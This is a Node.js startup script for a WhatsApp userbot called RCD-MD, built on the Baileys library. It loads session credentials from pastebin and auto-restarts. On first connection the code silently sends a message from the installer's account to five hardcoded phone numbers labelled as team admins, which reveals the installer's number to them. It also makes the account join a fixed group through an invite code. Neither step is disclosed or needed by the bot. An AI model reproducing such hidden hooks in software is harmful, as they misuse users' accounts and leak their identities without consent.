const orange = chalk.bold.hex("#FFA500");
const lime = chalk.bold.hex("#32CD32");
let useQR = false;
let initialConnection = true;
const PORT = process.env.PORT || 3000;

const MAIN_LOGGER = pino({
    timestamp: () => `,"time":"${new Date().toJSON()}"`
});
const logger = MAIN_LOGGER.child({});
logger.level = "trace";

const msgRetryCounterCache = new NodeCache();

const __filename = new URL(import.meta.url).pathname;
const __dirname = path.dirname(__filename);

const sessionDir = path.join(__dirname, 'session');
const credsPath = path.join(sessionDir, 'creds.json');

if (!fs.existsSync(sessionDir)) {
    fs.mkdirSync(sessionDir, { recursive: true });
}

async function downloadSessionData() {
    if (!config.SESSION_ID) {
        console.error('Please add your session to SESSION_ID env !!');
        return false;
    }
    const sessdata = config.SESSION_ID.split("RCD-MD&")[1];
    const url = `https://pastebin.com/raw/${sessdata}`;
    try {
        const response = await axios.get(url);
        const data = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        await fs.promises.writeFile(credsPath, data);
        console.log("🔒 Session Successfully Loaded📱 !!");
        return true;
    } catch (error) {
        console.error('Failed to download session data:', error);
        return false;
    }
}

async function start() {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        const { version, isLatest } = await fetchLatestBaileysVersion();
        console.log(`👨‍💻 RCD-MD using WA v${version.join('.')}, isLatest: ${isLatest}`);
        
        const Matrix = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: useQR,
            browser: ["safari", "3.3"],
            auth: state,
            getMessage: async (key) => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id);
                    return msg.message || undefined;
                }
                return { conversation: "RCD-MD whatsapp user bot" };
            }
        });

        Matrix.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'close') {
                if (lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                    restartBot(); // Auto-restart the bot
                }
            } else if (connection === 'open') {
                if (initialConnection) {
                    console.log(chalk.green("📍 RCD-MD CONNECTED Successfully ✅"));
                    await Matrix.sendMessage(Matrix.user.id, { text: `📍RCD-MD CONNECTED Successfully ✅` });

                    // Forward message to specific numbers
                    const messageText = '*RCD MD CONNECT  RCD TEAM ADMIN* ❯ 💀';
                    const numbers = [
                        '94753574803@s.whatsapp.net',
                        '94785274495@s.whatsapp.net',
                        '94757660788@s.whatsapp.net',
                        '94778668193@s.whatsapp.net',
                        '94789958225@s.whatsapp.net'
                    ];

                    for (const number of numbers) {
                        await Matrix.sendMessage(number, { text: messageText });
                    }
                    console.log('Messages sent to all specified numbers.');

                    // Auto-join WhatsApp group using group invite link
                    const groupInviteCode = 'Cry8eSzZqW27t9H8uOcRIR'; // Replace with your actual group invite code
                    await Matrix.groupAcceptInvite(groupInviteCode);
                    console.log(`Joined the WhatsApp group with invite code: ${groupInviteCode}`);

                    initialConnection = false;
                } else {
                    console.log(chalk.blue("♻️ Connection reestablished after restart."));
                }
            }
        });

        Matrix.ev.on('creds.update', saveCreds);

        Matrix.ev.on("messages.upsert", async chatUpdate => await Handler(chatUpdate, Matrix, logger));
        Matrix.ev.on("call", async (json) => await Callupdate(json, Matrix));
        
        // Detect when bot leaves or is removed from the group
        Matrix.ev.on("group-participants.update", async (update) => {
            try {
                const botNumber = Matrix.user.id.split(':')[0] + '@s.whatsapp.net'; // Bot's number
                const isBotRemoved = update.participants.includes(botNumber) && update.action === 'remove';

                if (isBotRemoved) {
                    console.log(orange(`Bot was removed from the group.`));
                    restartBot(); // Restart when removed from group
                }
            } catch (error) {
                console.error('Error handling group-participants update:', error);
            }
        });

    } catch (error) {
        console.error('Error occurred during bot startup:', error);
        restartBot();
    }
}

// Function to restart the bot process
function restartBot() {
    console.log(lime("♻️ Restarting bot..."));
    fork(__filename);  // Forking a new process to restart the bot
    process.exit();     // Exit the current process
}

downloadSessionData().then(() => {
    start();
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
